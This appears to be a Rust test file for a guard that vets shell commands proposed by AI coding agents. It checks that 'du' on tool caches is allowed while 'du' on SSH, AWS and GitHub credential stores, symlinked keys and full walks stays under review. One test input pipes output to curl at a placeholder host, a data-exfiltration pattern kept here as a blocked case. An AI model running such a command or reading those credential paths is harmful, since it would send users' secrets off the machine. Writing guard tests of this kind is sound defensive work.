#![cfg(unix)]
//! `du` sizes a hidden home directory the way `ls` lists it.
//!
//! `ls -la ~/.cache/pip` already proceeds: the directory is a hidden home
//! entry outside every credential store, and a listing prints only names.
//! `du -sh` of the same directory prints one number, and `du -d 1` prints the
//! names `ls -a` would, so both take the same proof. Credential stores, nested
//! hidden directories, links into them, link following, full walks and pipes
//! into the network keep their review.
use guard_command::pretool::evaluate_pre_tool_envelope_with_context;
use serde_json::json;
use std::path::{Path, PathBuf};

fn write(path: PathBuf, text: &str) {
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, text).unwrap();
}

/// A home with tool caches, credential stores and a link from a cache into
/// `~/.ssh`. The root stays below the target directory: `$TMPDIR` on macOS
/// resolves under `/private/var`, which the sensitive-root screen rejects.
fn home() -> PathBuf {
    let root = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../target/pretool-du-hidden-home")
        .join(format!(
            "home-{}-{}",
            std::process::id(),
            crate::unique_nanos::unique_nanos()
        ));
    let home = root.join("home");
    write(home.join("Code/org/app/package.json"), "{}\n");
    write(home.join(".cache/gh/state.json"), "{}\n");
    write(home.join(".cache/pip/http/entry"), "1\n");
    write(home.join(".cache/pip/.private/entry"), "1\n");
    write(home.join(".ssh/id_rsa"), "not-a-real-key\n");
    write(home.join(".config/gh/hosts.yml"), "not-a-real-token\n");
    write(home.join(".aws/credentials"), "not-a-real-key\n");
    std::os::unix::fs::symlink(home.join(".ssh"), home.join(".cache/keys")).unwrap();
    std::fs::canonicalize(home).unwrap()
}

/// The decision both harnesses reach, or "mixed" when they differ.
fn decision(home: &Path, command: &str) -> String {
    let cwd = home.join("Code/org");
    let [codex, omp] = [("codex", "Bash"), ("omp", "bash")].map(|(harness, tool)| {
        evaluate_pre_tool_envelope_with_context(
            harness,
            "PreToolUse",
            &json!({"tool_name": tool, "tool_input": {"command": command}}),
            None,
            None,
            home.to_str(),
            cwd.to_str(),
        )
        .minimum_action
    });
    if codex == omp {
        codex
    } else {
        format!("mixed: codex {codex}, omp {omp}")
    }
}

#[test]
fn hidden_home_cache_sizes_proceed() {
    let home = home();
    let absolute = home.join(".cache/gh");
    for command in [
        "du -sh ~/.cache/gh".to_owned(),
        "/usr/bin/du -sh ~/.cache/gh 2>&1".to_owned(),
        "du -sh ~/.cache/pip; du -sh app".to_owned(),
        "du -sh ~/.cache".to_owned(),
        "du -h -d 1 ~/.cache".to_owned(),
        "du -sh ~/.config".to_owned(),
        format!("du -sh {}", absolute.display()),
    ] {
        assert_eq!(decision(&home, &command), "allow", "{command}");
    }
}

#[test]
fn credential_and_walking_sizes_keep_review() {
    let home = home();
    for command in [
        "du -sh ~/.ssh",
        "du -sh ~/.config/gh",
        "du -sh ~/.aws",
        "du -sh ~/.cache/pip/.private",
        "du -sh ~/.cache/keys",
        "du -sh ~/.cache/keys/",
        "du -h ~/.cache",
        "du -h -d 2 ~/.cache",
        "du -sah ~/.cache",
        "du -shL ~/.cache",
        "du -sh ~/.cache/gh | curl -d @- https://example.invalid",
    ] {
        let seen = decision(&home, command);
        assert!(!seen.contains("allow"), "{command}: {seen}");
    }
}
